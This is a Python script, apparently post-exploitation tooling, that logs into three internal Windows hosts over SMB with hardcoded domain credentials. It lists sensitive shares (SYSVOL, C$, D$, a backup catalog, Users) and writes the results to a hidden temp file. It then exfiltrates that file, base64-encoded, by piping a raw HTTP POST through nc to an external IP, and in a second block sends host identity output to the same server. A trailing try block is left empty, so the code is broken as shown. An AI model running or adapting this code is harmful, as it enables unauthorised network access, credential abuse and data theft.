#!/usr/bin/env python3
import sys, base64, subprocess
sys.path.insert(0, "/tmp/imp")
O = "/tmp/.DBGW.txt"
out = open(O, "w", buffering=1)
def w(s):
    try: out.write(str(s) + "\n")
    except Exception: pass
from impacket.smbconnection import SMBConnection

JOBS = [("10.61.10.10", ["SYSVOL", "Public_M", "Public_S", "Public_T", "C$", "D$"]),
        ("10.61.10.11", ["SYSVOL", "C$"]),
        ("10.61.10.12", ["VBRCatalog", "Users", "C$"])]
for ip, shares in JOBS:
    try:
        c = SMBConnection(ip, ip, timeout=8)
        c.login("rez", "!QAZxsw2", "MLT", "", "")
        w("=== %s rez login OK" % ip)
    except Exception as e:
        w("=== %s rez login FAIL %s" % (ip, str(e)[:80])); continue
    for sh in shares:
        w("-- share %s --" % sh)
        try:
            n = 0
            for f in c.listPath(sh, "\\*"):
                n += 1
                try:
                    w("  %s %s %d" % ("D" if f.is_directory() else "F", f.get_longname(), f.get_filesize()))
                except Exception:
                    w("  ?entry")
            w("  count=%d" % n)
        except Exception as e:
            w("  ERR %s" % str(e)[:120])
    try: c.logoff()
    except Exception: pass
w("DBGW_DONE")
out.close()
b = base64.b64encode(open(O, "rb").read()).decode()
subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel_lat_dbgw\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 90 nc 131.123.43.239 80" % (len(b), b), shell=True)

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

